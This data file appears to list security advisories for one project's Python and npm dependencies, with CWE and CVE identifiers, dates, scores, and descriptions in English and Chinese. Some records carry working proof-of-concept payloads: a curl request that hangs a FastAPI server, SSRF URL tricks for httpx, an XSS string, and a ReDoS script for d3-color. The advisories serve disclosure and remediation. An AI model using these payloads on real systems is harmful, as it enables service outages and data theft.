curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\""\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'
```

You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%

You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.

If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.

Cheers

#### Impact

An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.

#### Occurrences

[params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)

</details>",2,2
aimhubio_aim,httpx,,True,,CWE-20,2022-05-13,"## Overview
[httpx](https://pypi.org/project/httpx) is a The next generation HTTP client.

Affected versions of this package are vulnerable to Improper Input Validation due to improper implementation of `httpx.URL().copy_with`, that causes `httpx.Client` and `httpx.Proxy` to parse wrong URL. Exploiting this vulnerability leads to blacklist bypass.

## PoC:

**httpx.Client**

```python
user_input_from_http_request = 'http:////admin-dashboard/secret'
u = httpx.URL(user_input_from_http_request)
assert u.host.lower() != 'admin-dashboard'
resp = httpx.Client(base_url=u).get('/') # SSRF to http://admin-dashboard/secret
print(resp.text) # sensitive data leak
```

**httpx.Proxy**

```python
user_input_from_http_request = 'http://x@//internal-proxy:8082/'
u = httpx.URL(user_input_from_http_request)
assert u.host.lower() != 'internal-proxy'
# httpx.Proxy(u).url.netloc == b'internal-proxy:8082'
resp = httpx.Client(proxies=u).get('/') # will request via http proxy at internal-proxy:8082
```
## Remediation
Upgrade `httpx` to version 0.23.0 or higher.
## References
- [GitHub Commit](https://github.com/encode/httpx/pull/2185/commits/e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1)
- [GitHub Issue](https://github.com/encode/httpx/issues/2184)
- [GitHub PR](https://github.com/encode/httpx/pull/2185)
",3,0
aimhubio_aim,httpx,,True,CVE-2021-41945,CWE-20,2022-04-28,"Encode OSS httpx是英国Encode OSS公司的一个功能齐全的 HTTP 客户端。提供同步和异步 API，支持 HTTP/1.1 和 HTTP/2。
Encode OSS httpx 1.0.0 版本及其之前版本存在输入验证错误漏洞，该漏洞源于httpx.URL和httpx.Client和httpx.URL.copy_with的函数输入验证不当。",1,2
aimhubio_aim,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
aimhubio_aim,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
aimhubio_aim,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
aimhubio_aim,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
aimhubio_aim,loader-utils,2.0.0,False,CVE-2022-37601,CWE-1321,2022-10-12,"loader-utils是webpack开源的一个用于 webpack 加载器的实用程序。
webpack loader-utils 2.0.0版本存在安全漏洞，该漏洞源于parseQuery.js的parseQuerys函数中发现包含原型污染漏洞。",1,2
aimhubio_aim,express,4.17.1,False,CVE-2024-29041,CWE-601 CWE-1286,2024-03-25,"Express.js是Express.js开源的一个 Node.js 的快速、无限制、极简的 web 框架。
Express.js 4.19.0之前版本、5.0版本存在安全漏洞，该漏洞源于允许使用格式错误的 URL 开放重定向。",3,0
aimhubio_aim,path-to-regexp,0.1.7,False,CVE-2024-52798,CWE-1333,2024-12-05,Path-to-RegExp 是 pillarjs 开源的工具，主要用于将路径字符串转换为正则表达式。在 0.1.12 之前的版本中，存在正则表达式拒绝服务漏洞（ReDoS）。该漏洞的根本原因是由于在路径段中包含多个正则表达式参数时性能极差。这种性能问题会锁定事件循环，导致服务不可用。攻击者可以利用此漏洞，通过巧妙构造输入来迫使服务不堪重负，从而触发拒绝服务。,2,2
aimhubio_aim,qs,6.7.0,False,CVE-2022-24999,CWE-1321,2022-11-26,"ljharb qs是美国Jordan Harband个人开发者的一个具有嵌套支持的查询字符串解析器。
qs 6.10.3 之前版本存在安全漏洞，该漏洞源于parse忽略__proto__键，攻击者利用该漏洞可以将攻击载荷放在用于访问应用程序的 URL 的查询字符串中。",2,1
aimhubio_aim,serve-static,1.14.1,False,CVE-2024-43800,CWE-79,2024-09-10,"Express.js是expressjs开源的一个 Node.js 的快速、无限制、极简的 web 框架。
Express.js存在跨站脚本漏洞，该漏洞源于将不受信任的用户输入传递给redirect()，可能会执行不受信任的代码。",4,0
aimhubio_aim,cookie,0.4.0,False,CVE-2024-47764,CWE-74,2024-10-04,"cookie是jshttp开源的一个 HTTP 服务器 cookie 解析和序列化库。
cookie 0.7.0之前版本存在安全漏洞，该漏洞源于允许攻击者通过操纵cookie名称来设置cookie的其他字段，导致意外的cookie值。",3,2
aimhubio_aim,send,0.17.1,False,CVE-2024-43799,CWE-79,2024-09-10,"send是pillarjs开源的一个用于将文件从文件系统流式传输为 http 响应的库。
send 0.19.0之前版本存在跨站脚本漏洞，该漏洞源于将不受信任的用户输入传递给SendStream.redirect()，从而执行不受信任的代码。",4,0
aimhubio_aim,body-parser,1.19.0,False,CVE-2024-45590,CWE-405,2024-09-10,"body-parser 是 expressjs 开源的一个 Node.js 解析中间件，它用于处理 JSON, Raw, Text 和 URL 编码的数据。body-parser 1.20.3 之前版本存在一个安全漏洞，这个漏洞的根本原因在于处理请求时的资源管理不当，导致系统无法及时响应，并可能因大量请求导致拒绝服务攻击。",2,1
aimhubio_aim,loader-utils,1.4.0,False,CVE-2022-37601,CWE-1321,2022-10-12,"loader-utils是webpack开源的一个用于 webpack 加载器的实用程序。
webpack loader-utils 2.0.0版本存在安全漏洞，该漏洞源于parseQuery.js的parseQuerys函数中发现包含原型污染漏洞。",1,2
aimhubio_aim,micromatch,3.1.10,False,CVE-2024-4067,CWE-1333,2024-05-13,NPM 包 `micromatch` 存在正则表达式拒绝服务 (ReDoS) 漏洞。漏洞出现在 `index.js` 文件中的 `micromatch.braces()` 函数中，由于模式 `.*` 会贪婪地匹配任何内容，攻击者可以通过传递恶意负载，使得模式匹配不断回溯输入，导致应用挂起或变慢。虽然已经合并了修复，但进一步测试表明问题依然存在。,3,2
aimhubio_aim,braces,3.0.2,False,CVE-2024-4068,CWE-1050 CWE-400,2024-05-13,NPM 包 braces 3.0.3 之前的版本未能限制它可以处理的字符数量，这可能导致内存耗尽。在 lib/parse.js 文件中，如果恶意用户输入“不平衡的大括号”，解析过程会进入循环，导致程序开始分配堆内存而不释放它。最终，JavaScript 堆限制被达到，程序将崩溃。,2,2
aimhubio_aim,unset-value,1.0.0,False,,CWE-1321,2022-02-13,"## Overview

Affected versions of this package are vulnerable to Prototype Pollution via the `unset` function in `index.js`, because it allows access to object prototype properties.

## Details

Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.

There are two main ways in which the pollution of prototypes occurs:

-   Unsafe `Object` recursive merge
    
-   Property definition by path
    

### Unsafe Object recursive merge

The logic of a vulnerable recursive merge function follows the following high-level model:
```
merge (target, source)

  foreach property of source

    if property exists and is an object on both the target and the source

      merge(target[property], source[property])

    else

      target[property] = source[property]
```
<br>  

When the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.

Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.

`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.

### Property definition by path

There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`

If the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.

## Types of attacks

There are a few methods by which Prototype Pollution can be manipulated:

| Type |Origin  |Short description |
|--|--|--|
| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |
 |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|
|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|

## Affected environments

The following environments are susceptible to a Prototype Pollution attack:

-   Application server
    
-   Web server

-   Web browser
    

## How to prevent

1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.
    
2.  Require schema validation of JSON input.
    
3.  Avoid using unsafe recursive merge functions.
    
4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.
    
5.  As a best practice use `Map` instead of `Object`.

### For more information on this vulnerability type:

[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)

## Remediation
Upgrade `unset-value` to version 2.0.1 or higher.
## References
- [GitHub Commit](https://github.com/jonschlinkert/unset-value/pull/12/commits/abb534769f6ea62c3dd988f5ce0a4ebd1f91b561)
- [GitHub Issue](https://github.com/jonschlinkert/unset-value/issues/11)
- [GitHub PR](https://github.com/jonschlinkert/unset-value/pull/12)
- [GitHub Release](https://github.com/jonschlinkert/unset-value/releases)
",2,2
aimhubio_aim,serialize-javascript,4.0.0,False,,CWE-79,2024-01-09,"## Overview
[serialize-javascript](https://www.npmjs.com/package/serialize-javascript) is a package to serialize JavaScript to a superset of JSON that includes regular expressions and functions.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to unsanitized URLs. An Attacker can introduce unsafe `HTML` characters through non-http `URLs`.
## PoC
```js
const serialize = require('serialize-javascript');

let x = serialize({
    x: new URL(""x:</script>"")
});

console.log(x)
```
## Details

A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.

This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.

Injecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.

Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.
 
The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. 

### Types of attacks
There are a few methods by which XSS can be manipulated:

|Type|Origin|Description|
|--|--|--|
|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|
|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| 
|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|
|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|

### Affected environments
The following environments are susceptible to an XSS attack:

* Web servers
* Application servers
* Web application environments

### How to prevent
This section describes the top best practices designed to specifically protect your code: 

* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. 
* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. 
* Give users the option to disable client-side scripts.
* Redirect invalid requests.
* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.
* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.
* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.

## Remediation
Upgrade `serialize-javascript` to version 6.0.2 or higher.
## References
- [GitHub Commit](https://github.com/yahoo/serialize-javascript/commit/f27d65d3de42affe2aac14607066c293891cec4e)
- [GitHub Issue](https://github.com/yahoo/serialize-javascript/issues/172)
",3,0
aimhubio_aim,serialize-javascript,4.0.0,False,CVE-2024-11831,CWE-79,2025-02-10,"Serialize JavaScript是Yahoo开源的一个将 JavaScript 序列化为包含正则表达式和函数的 JSON 超集。
Serialize JavaScript存在跨站脚本漏洞，该漏洞源于没有正确清理某些输入。攻击者利用该漏洞可以注入恶意代码。",3,0
aimhubio_aim,braces,2.3.2,False,CVE-2024-4068,CWE-1050 CWE-400,2024-05-13,NPM 包 braces 3.0.3 之前的版本未能限制它可以处理的字符数量，这可能导致内存耗尽。在 lib/parse.js 文件中，如果恶意用户输入“不平衡的大括号”，解析过程会进入循环，导致程序开始分配堆内存而不释放它。最终，JavaScript 堆限制被达到，程序将崩溃。,2,2
aimhubio_aim,elliptic,6.5.4,False,CVE-2024-48949,CWE-347,2024-10-10,"Elliptic是Fedor Indutny个人开发者的一个 javascript 中的快速椭圆曲线密码库。
Elliptic 6.5.6之前版本存在安全漏洞，该漏洞源于验证函数省略了一些判断验证。",2,2
aimhubio_aim,elliptic,6.5.4,False,CVE-2024-42460,CWE-130,2024-08-02,"Elliptic是Fedor Indutny个人开发者的一个 javascript 中的快速椭圆曲线密码库。
Elliptic 6.5.6版本存在安全漏洞，该漏洞源于缺少对r和s的前导位是否为零的检查，因此出现了ECDSA签名可延展性问题。",1,2
aimhubio_aim,elliptic,6.5.4,False,CVE-2024-42459,CWE-347,2024-08-02,"Elliptic是Fedor Indutny个人开发者的一个 javascript 中的快速椭圆曲线密码库。
Elliptic 6.5.6版本存在安全漏洞，该漏洞源于缺少签名长度检查，因此会出现EDDSA签名可延展性问题。",1,2
aimhubio_aim,elliptic,6.5.4,False,CVE-2024-48948,CWE-347,2024-10-15,"Elliptic是Fedor Indutny个人开发者的一个 javascript 中的快速椭圆曲线密码库。
Elliptic 6.5.7版本存在安全漏洞，该漏洞源于在其 ECDSA 实现中无法正确验证有效签名。",2,0
aimhubio_aim,elliptic,6.5.4,False,CVE-2024-42461,CWE-347,2024-08-02,"Elliptic是Fedor Indutny个人开发者的一个 javascript 中的快速椭圆曲线密码库。
Elliptic 6.5.6版本存在安全漏洞，该漏洞源于允许使用BER编码签名，因此出现了ECDSA签名可延展性。",1,1
aimhubio_aim,pbkdf2,3.1.2,False,CVE-2025-6547,CWE-20,2025-06-23,pbkdf2 是一个用于生成密码派生密钥的库，广泛用于密码安全机制中。该库在处理 Uint8Array 输入时存在输入验证错误，在旧版本的 Node.js 环境（版本低于 3.0.0）下，该库会忽略 Uint8Array 类型的输入，并返回固定的静态密钥。这一错误可能导致生成错误的密钥，进而影响使用该库的应用程序的密码安全性。,1,-2
aimhubio_aim,pbkdf2,3.1.2,False,CVE-2025-6545,CWE-20,2025-06-23,"PBKDF2 是一种广泛使用的密码分块函数，用于由一个密码生成一个加密密钥，常用于存储密码以及其他加密操作。此漏洞存在于 'pbkdf2' 模块中的 lib/to-buffer.js 文件中，影响了版本 3.0.10 至 3.1.2。漏洞的根本原因在于输入验证不当，导致处理不受支持的算法（如'sha3-256', 'sha3-512'）或非规范化的算法（如'Sha256', 'Sha512'）时，生成了可以预测的零填充内存。这使得攻击者可以利用这一特性进行签名伪造，从而危害到应用程序的完整性和机密性。通过在适用于Node.js的环境下，调用`pbkdf2`模块中的`pbkdf2Sync`方法，攻击者可以获得高度可预测的密钥输出，从而破坏许多密码学安全性假设。",1,-2
aimhubio_aim,store2,2.14.2,False,CVE-2024-57556,CWE-79,2025-01-23,"nbubna store是Nathan Bubna个人开发者的一个方法库。
nbubna store v.2.14.2版本及之前版本存在安全漏洞。攻击者利用该漏洞可以通过 store.deep.js 组件执行任意代码。",4,0
aimhubio_aim,ip,2.0.0,False,CVE-2024-29415,CWE-918 CWE-941,2024-05-27,"在Node.js中，ip包（版本2.0.1及之前）由于不正确地将某些IP地址（如127.1, 01200034567, 012.1.2.3, 000:0:0000::01和::fFFf:127.0.0.1）分类为全球可路由，从而可能允许服务器端请求伪造（SSRF）。需要注意的是，这个问题是由于CVE-2023-42282修复不完全而引发的。",2,1
aimhubio_aim,ws,8.11.0,False,CVE-2024-37890,CWE-476,2024-06-16,Node.js的ws模块是一个开源的WebSocket客户端和服务器实现。在存在漏洞的版本中，攻击者可以发送包含超过server.maxHeadersCount阈值数量的头的请求，从而使得ws服务器崩溃。,2,2
aimhubio_aim,form-data,3.0.1,False,CVE-2025-7783,CWE-330,2025-07-18,"form-data 是一个用于处理表单数据的库，常用于 Node.js 应用中处理多部分表单提交。该库在版本 < 2.5.4, 3.0.0 - 3.0.3, 4.0.0 - 4.0.3 中存在使用不足随机值的漏洞。具体来说，form-data 使用了 Math.random() 函数来生成多部分表单的边界字符串。由于 Math.random() 生成的值是伪随机且可预测的，攻击者可以通过观察应用中生成的随机值，预测边界字符串的生成，从而实现 HTTP 参数污染攻击。攻击者通过注入额外的参数影响服务器的参数解析和执行逻辑。此漏洞的根本原因是随机值生成器的随机性不足，允许攻击者预测 boundary 值并构造恶意请求。",1,1
aimhubio_aim,trim,0.0.1,False,CVE-2020-7753,CWE-400,2020-10-27,"Components trim是Components团队的一个用于去除字符串两端空格的 Npm 代码库。
Service trim 所有版本存在安全漏洞，该漏洞源于容易受到通过trim()的正则表达式拒绝服务的攻击。",2,2
aimhubio_aim,min-document,2.19.0,False,CVE-2025-57352,CWE-1321,2025-09-24,"min-document是Jake Verbaten个人开发者的一个软件库。
min-document 2.19.0之前版本存在安全漏洞，该漏洞源于removeAttributeNS方法对命名空间操作处理不当，可能导致拒绝服务或执行任意代码。",3,2
aimhubio_aim,micromatch,4.0.4,False,CVE-2024-4067,CWE-1333,2024-05-13,NPM 包 `micromatch` 存在正则表达式拒绝服务 (ReDoS) 漏洞。漏洞出现在 `index.js` 文件中的 `micromatch.braces()` 函数中，由于模式 `.*` 会贪婪地匹配任何内容，攻击者可以通过传递恶意负载，使得模式匹配不断回溯输入，导致应用挂起或变慢。虽然已经合并了修复，但进一步测试表明问题依然存在。,3,2
aimhubio_aim,got,9.6.0,False,CVE-2022-33987,CWE-918,2022-06-18,"got是适用于 Node.js 的人性化且功能强大的 HTTP 请求库。
got 12.1.0 之前版本存在安全漏洞，该漏洞源于允许重定向到 UNIX 套接字。",3,2
aimhubio_aim,cacheable-request,6.1.0,False,,CWE-1333,2023-02-11,"## This advisory is withdawn.

cacheable-request depends on http-cache-semanttics, which contains an Inefficient Regular Expression Complexity in versions prior to 4.1.1 of that package. cacheable-request has been updated to rely on the fixed version in 10.2.7. 

### Summary of http-cache-semantics vulnerability
http-cache semantics contains an Inefficient Regular Expression Complexity , leading to Denial of Service. This affects versions of the package http-cache-semantics before 4.1.1. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library.

### Details
https://github.com/advisories/GHSA-rc47-6667-2j5j

",2,2
aimhubio_aim,base-x,3.0.8,False,CVE-2025-27611,CWE-1007,2025-04-30,base-x 是一个使用比特币风格前导零压缩的任意字母表编码解码器。版本4.0.0、5.0.0及3.0.11之前的所有版本存在同形异义字符欺骗漏洞，攻击者可利用该漏洞通过Unicode相似字符绕过验证，诱导用户向错误地址发送资金。该漏洞已在3.0.11、4.0.1和5.0.1版本中修复。,2,2
aimhubio_aim,cipher-base,1.0.4,False,CVE-2025-9287,CWE-20,2025-08-20,"cipher-base是Browserify开源的一个加密流的抽象基类。
cipher-base 1.0.4及之前版本存在安全漏洞，该漏洞源于输入验证不当，可能导致输入数据被篡改。",1,2
aimhubio_aim,fast-loops,1.1.3,False,CVE-2024-39008,CWE-1321,2024-07-01,robinweser fast-loops v1.1.3 版本中的 objectMergeDeep 函数被发现存在原型污染漏洞。攻击者通过注入任意属性，可在受影响系统上执行任意代码或引发拒绝服务（DoS）。,3,2
aimhubio_aim,d3-color,3.0.1,False,,CWE-400,2022-09-29,The d3-color module provides representations for various color spaces in the browser. Versions prior to 3.1.0 are vulnerable to a Regular expression Denial of Service. This issue has been patched in version 3.1.0. There are no known workarounds.,2,-2
aimhubio_aim,d3-color,3.0.1,False,,CWE-400,2021-07-05,"## Overview
[d3-color](https://www.npmjs.org/package/d3-color) is a Color spaces! RGB, HSL, Cubehelix, Lab and HCL (Lch).

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `rgb()` and `hrc()` functions. 

PoC by Yeting Li: 
```
var d3Color = require(""d3-color"")
// d3Color.rgb(""rgb(255,255,255)"")

function build_blank(n) {
    var ret = ""rgb(""
    for (var i = 0; i < n; i++) {
        ret += ""1""
    }
    return ret + ""!"";
}

for(var i = 1; i <= 5000000; i++) {
    if (i % 1000 == 0) {
        var time = Date.now();
        var attack_str = build_blank(i)
        d3Color.rgb(attack_str)
        var time_cost = Date.now() - time;
        console.log(""attack_str.length: "" + attack_str.length + "": "" + time_cost+"" ms"")
    }
}
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `d3-color` to version 3.1.0 or higher.
## References
- [Github PR](https://github.com/d3/d3-color/pull/100)
- [Github PR](https://github.com/d3/d3-color/pull/99)
- [GitHub PR](https://github.com/d3/d3-color/pull/89)
- [Github Releases](https://github.com/d3/d3-color/releases/tag/v3.1.0)
",3,2
aimhubio_aim,d3-color,1.4.1,False,,CWE-400,2022-09-29,The d3-color module provides representations for various color spaces in the browser. Versions prior to 3.1.0 are vulnerable to a Regular expression Denial of Service. This issue has been patched in version 3.1.0. There are no known workarounds.,2,-2
aimhubio_aim,d3-color,1.4.1,False,,CWE-400,2021-07-05,"## Overview
[d3-color](https://www.npmjs.org/package/d3-color) is a Color spaces! RGB, HSL, Cubehelix, Lab and HCL (Lch).

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `rgb()` and `hrc()` functions. 

PoC by Yeting Li: 
```
var d3Color = require(""d3-color"")
// d3Color.rgb(""rgb(255,255,255)"")

function build_blank(n) {
    var ret = ""rgb(""
    for (var i = 0; i < n; i++) {
        ret += ""1""
    }
    return ret + ""!"";
}

for(var i = 1; i <= 5000000; i++) {
    if (i % 1000 == 0) {
        var time = Date.now();
        var attack_str = build_blank(i)
        d3Color.rgb(attack_str)
        var time_cost = Date.now() - time;
        console.log(""attack_str.length: "" + attack_str.length + "": "" + time_cost+"" ms"")
    }
}
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

